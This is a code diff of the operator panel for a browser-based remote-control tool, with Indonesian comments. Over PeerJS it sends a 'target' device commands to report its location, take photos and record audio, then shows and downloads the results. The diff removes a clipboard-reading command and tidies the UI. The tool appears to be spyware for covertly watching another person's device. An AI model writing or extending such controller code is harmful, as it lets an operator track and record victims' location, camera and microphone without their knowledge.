@@ -85,7 +85,7 @@
       border-radius: 24px;
       padding: 16px;
       margin-top: 16px;
-      max-height: 300px;
+      max-height: 350px;
       overflow-y: auto;
     }
     .result-title {
@@ -128,7 +128,6 @@
     <button class="ctrl-btn" id="btnFoto" disabled>📷 Ambil Foto</button>
     <button class="ctrl-btn" id="btnRekam" disabled>🎙️ Mulai Rekam</button>
     <button class="ctrl-btn" id="btnStopRekam" disabled>⏹️ Stop & Kirim</button>
-    <button class="ctrl-btn" id="btnClipboard" disabled>📋 Baca Clipboard</button>
   </div>
   
   <div class="result-area">
@@ -150,14 +149,12 @@
   const peerIdInput = document.getElementById('peerIdInput');
   const connectBtn = document.getElementById('connectBtn');
   
-  // Tombol-tombol
   const btns = {
     lokasi: document.getElementById('btnLokasi'),
     notif: document.getElementById('btnNotif'),
     foto: document.getElementById('btnFoto'),
     rekam: document.getElementById('btnRekam'),
-    stopRekam: document.getElementById('btnStopRekam'),
-    clipboard: document.getElementById('btnClipboard')
+    stopRekam: document.getElementById('btnStopRekam')
   };
   
   function enableButtons(enabled) {
@@ -187,9 +184,6 @@
         case 'audio':
           content += `🎵 Rekaman suara:<br><audio controls src="${data.audio}"></audio><br><a href="${data.audio}" download="rekaman_${Date.now()}.mp3">💾 Download MP3</a>`;
           break;
-        case 'clipboard':
-          content += `📋 Teks clipboard: "${data.text.substring(0, 200)}"`;
-          break;
         case 'recording_started':
           content += `🎙️ Rekaman dimulai di target... tunggu hingga selesai (max 15 detik)`;
           break;
@@ -212,7 +206,6 @@
     enableButtons(isConn);
   }
   
-  // Kirim perintah ke target
   function sendCommand(type, extra = {}) {
     if (!connection || !connection.open) {
       addResult('error', { error: 'Tidak terhubung ke target' }, true);
@@ -222,7 +215,6 @@
     addResult('command', `📤 Mengirim perintah: ${type}`);
   }
   
-  // Setup koneksi
   function connectToPeer(peerId) {
     if (connection) {
       connection.close();
@@ -232,8 +224,8 @@
     connection = peer.connect(peerId);
     
     connection.on('open', () => {
-      updateConnectionStatus(`Terhubung ke ${peerId}`, true);
-      addResult('connection', `✅ Berhasil terhubung ke target: ${peerId}`);
+      updateConnectionStatus(`Terhubung ke ${peerId.substring(0, 15)}...`, true);
+      addResult('connection', `✅ Berhasil terhubung ke target`);
     });
     
     connection.on('data', (data) => {
@@ -256,13 +248,11 @@
     });
   }
   
-  // Inisialisasi Peer (Controller juga punya ID sendiri)
   function initPeer() {
     peer = new Peer();
     
     peer.on('open', (id) => {
       console.log('Controller ID:', id);
-      addResult('info', `🆔 ID Controller: ${id.substring(0, 15)}... (bisa diabaikan)`);
     });
     
     peer.on('error', (err) => {
@@ -282,7 +272,6 @@
   btns.foto.onclick = () => sendCommand('take_photo');
   btns.rekam.onclick = () => sendCommand('start_record');
   btns.stopRekam.onclick = () => sendCommand('stop_record');
-  btns.clipboard.onclick = () => sendCommand('read_clipboard');
   
   connectBtn.onclick = () => {
     const peerId = peerIdInput.value.trim();
@@ -293,7 +282,7 @@
     connectToPeer(peerId);
   };
   
-  // Minta izin notifikasi di controller juga
+  // Minta izin notifikasi di controller
   if ('Notification' in window) Notification.requestPermission();
   
   initPeer();
